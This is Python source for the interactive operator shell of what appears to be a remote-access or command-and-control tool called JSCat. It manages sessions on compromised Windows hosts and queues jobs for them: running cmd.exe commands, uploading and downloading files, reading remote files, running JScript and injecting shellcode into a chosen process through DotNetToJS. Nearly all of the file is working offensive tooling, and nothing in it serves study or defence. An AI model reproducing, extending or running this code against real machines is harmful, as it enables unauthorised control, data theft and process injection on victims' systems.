#!/usr/bin/env python3
# coding:utf-8
import shlex
import os
from base64 import b64encode
from prompt_toolkit import PromptSession

from lib.session import Session
from .color import BOLD
from .log import Log


class Shell():
    def __init__(self, ):
        self.session = Session() 
        self.PROMPT_MSG = 'JSCat >'
        self.CMD_SESSION = None
        self.input = PromptSession()

        self.alias = {'ls': 'dir ',
                      'kill': 'taskkill /F /PID ',
                      'ipconfig': 'ipconfig ',
                      'ifconfig': 'ipconfig ',
                      'netstat': 'netstat ',
                      'whoami': 'whoami /user',
                      'net': 'net ',
                      'wimc': 'wimc ',
                      }

    def __show_alias(self):
        print('{:>20}: {}'.format(BOLD('ALIAS_NAME'), BOLD('SHELL_CMD')))
        for alias_name, cmd in self.alias.items():
            print('{:>20}: {}'.format(BOLD(alias_name), cmd))

    def __print_session_help(self):
        print('Usage:')
        print('\t{}: list all sessions'.format(BOLD('sessions | s')))
        print('\t{} [sessionID]: interactive cmd with sessionID'.format(
            BOLD('sessions | s -i')))
        print('\t{} [sessionID]: show one session detail'.format(
            BOLD('sessions | s -v')))
        print('\t{} [sessionID]: remove one session'.format(
            BOLD('sessions | s -r')))
        print('\t{}: exit'.format(BOLD('exit/quit')))

    def __print_cmd_help(self):
        print('Usage:')
        print('\t{}: get system info'.format(BOLD('info')))
        print('\t{} [seconds]: set sleep time'.format(
            BOLD('sleep')))
        print('\t{}: show process list'.format(BOLD('ps')))
        print('\t{} [path_file]: show remote file context'.format(
            BOLD('cat')))
        print('\t{} [cmd]: run program and return'.format(
            BOLD('run')))
        print('\t{} [cmd]: execute shell command'.format(
            BOLD('shell')))
        print('\t{} [local_file] [remote_file]: upload file'.format(
            BOLD('upload')))
        print('\t{} [local_file] [remote_file]: download file'.format(
            BOLD('download')))
        print('\t{} [local_pathname]: run jscript file in remote host'.format(
            BOLD('js run')))
        print('\t{} [base64_shellcode | -f shellcode_raw_file] [pid]: inject shellcode  by DotNetToJS\n\t\t(shellcode is bas64encoded or raw file)'.format(BOLD('inject')))
        print('\t{}: show session jobs'.format(BOLD('jobs')))
        print('\t{}: show shell alias name'.format(BOLD('alias')))
        print('\t{}: exit current session'.format(BOLD('back')))

    '''
    执行文件上传、下载命令
    '''

    def __parse_cmd_upload_download(self, action, text):
        args_commands = shlex.split(text)
        if len(args_commands) != 3:
            print(
                'usage:{} [local_pathname] [remote_pathname[]'.format(action))
        else:
            if action == 'upload' and not os.path.exists(args_commands[1]):
                print('file {} not exist!'.format(args_commands[1]))
            else:
                self.CMD_SESSION['job'].add_job(
                    action, local_pathname=args_commands[1], remote_pathname=args_commands[2])

    '''
    执行运行jscript命令
    '''

    def __parse_cmd_js_run(self, action, text):
        args_commands = shlex.split(text)
        if len(args_commands) == 3 and args_commands[1] == 'run':
            if not os.path.exists(args_commands[2]):
                print('file {} not exist!'.format(args_commands[2]))
            else:
                self.CMD_SESSION['job'].add_job(
                    action, local_pathname=args_commands[2])
        else:
            print('usage:{} run [local_pathname]'.format(action))

    '''
    执行注入命令
    '''

    def __parse_cmd_inject(self, action, text):
        args_commands = shlex.split(text)
        if len(args_commands) == 1:
            print(
                'usage:inject [base64_shellcode | -f shellcode_raw_file] [pid]')
        else:
            # shellcode位于文件中
            if args_commands[1].strip() == '-f':
                if len(args_commands) <= 2:
                    print(
                        'usage:inject -f [shellcode_raw_file] [pid]')
                else:
                    if not os.path.exists(args_commands[2]):
                        print('file {} not exists'.format(
                            args_commands[2]))
                    else:
                        with open(args_commands[2], 'rb') as f:
                            shellcode = b64encode(f.read()).decode()
                        pid = args_commands[3] if len(
                            args_commands) > 3 else '0'
                        self.CMD_SESSION['job'].add_job(
                            action, shellcode=shellcode, pid=pid)
            # shellcode是base64编码
            else:
                shellcode = args_commands[1]
                pid = args_commands[2] if len(args_commands) > 2 else '0'
                self.CMD_SESSION['job'].add_job(
                    action, shellcode=args_commands[1], pid=pid)

    '''
    交互式执行命令
    '''

    def parse_cmd(self, commands, action, args, text):
        if not self.CMD_SESSION or action == 'back' or action == 'exit' or action == 'quit':
            self.CMD_SESSION = None
            self.PROMPT_MSG = 'JSCat >'
        elif action == 'help':
            self.__print_cmd_help()
        elif action == 'alias':
            self.__show_alias()
        elif action == 'info':
            self.CMD_SESSION['job'].add_job(action)
        elif action == 'ps':
            self.CMD_SESSION['job'].add_job(action)
        # 设置sleep时间
        elif action == 'sleep' and len(commands) == 2:
            try:
                self.CMD_SESSION['job'].add_job(
                    'sleep', sleep=str(int(commands[1])))
            except Exception as ex:
                print('[-]{}'.format(ex))
        # 执行shell命令
        elif action == 'shell':
            self.CMD_SESSION['job'].add_job(
                'shell', cmd='cmd.exe /c {}'.format(args))
        # 在远程主机上运行程序
        elif action == 'run':
            self.CMD_SESSION['job'].add_job(action, cmd=args)
        # 显示远程主机文本内容
        elif action == 'cat':
            self.CMD_SESSION['job'].add_job(action, remote_pathname=args)
        # 上传和下载
        elif action == 'upload' or action == 'download':
            self.__parse_cmd_upload_download(action, text)
        elif action in self.alias:
            self.CMD_SESSION['job'].add_job(
                'shell', cmd='cmd.exe /c {} {}'.format(self.alias.get(action), args))
        # 加载jscript脚本运行
        elif action == 'js':
            self.__parse_cmd_js_run(action, text)
        # shellcode 注入
        elif action == 'inject':
            self.__parse_cmd_inject(action, text)
        # 显示当前session的所有任务
        elif action == 'jobs':
            self.CMD_SESSION['job'].list_jobs()

    '''
    session命令
    '''

    def __parse_session_s(self, commands, args):
        if len(commands) < 3:
            self.session.list_sessions()
            return
        s = self.session.get_session(int(commands[2]))
        if not s:
            return
        if commands[1] == '-i':
            # 与指定SID进行交互式命令
            self.CMD_SESSION = s
            self.PROMPT_MSG = 'JSCat({})(SID:{}) >'.format(s['client_ip'], s['id'])
        elif commands[1] == '-v':
            # 显示一个SID的详细情况
            self.session.show_session_detail(int(commands[2]))
        elif commands[1] == '-k':
            # KILL SID
            confirm = self.input.prompt(
                'Confirm Kill Session:YES(y)/No(enter)?')
            if confirm == 'y':
                s['job'].add_job('kill')
        elif commands[1] == '-r':
            # 移除SID
            confirm = self.input.prompt(
                'Confirm Remove Session:YES(y)/No(enter)?')
            if confirm == 'y':
                self.session.remove_session(int(commands[2]))

    '''
    session管理
    '''

    def parse_session(self, commands, action, args):
        if action == 'sessions' or action == 's':
            self.__parse_session_s(commands, args)
        elif action == 'help':
            self.__print_session_help()
        elif action == 'exit' or action == 'quit':
            confirm = self.input.prompt('Confirm Exit:YES(y)/No(enter)?')
            return False if confirm == 'y' else True

        return True

    '''
    获取输入的命令并进行解析
    '''

    def get_command(self):
        try:
            text = self.input.prompt(self.PROMPT_MSG)
            if text.strip():
                Log.log_message(text, log_type=Log.CMD, output=False)
        except KeyboardInterrupt:
            confirm = self.input.prompt('Confirm Exit:YES(y)/No(enter)?')
            return False if confirm == 'y' else True
        # 为了确保路径能在windows里能正确执行，对\进行转义
        text = text.strip().replace('\\', '\\\\').replace('"', '\\"')
        # 按空格进行分隔参数
        commands = text.split(' ')
        if len(commands) == 0:
            return True

        # 命令与参数
        action = commands[0].strip()
        args = ' '.join([commands[x] for x in range(1, len(commands))])

        if self.CMD_SESSION:
            # 解析交互式命令
            self.parse_cmd(commands, action, args, text)
        else:
            # 解析session管理
            return self.parse_session(commands, action, args)

        return True
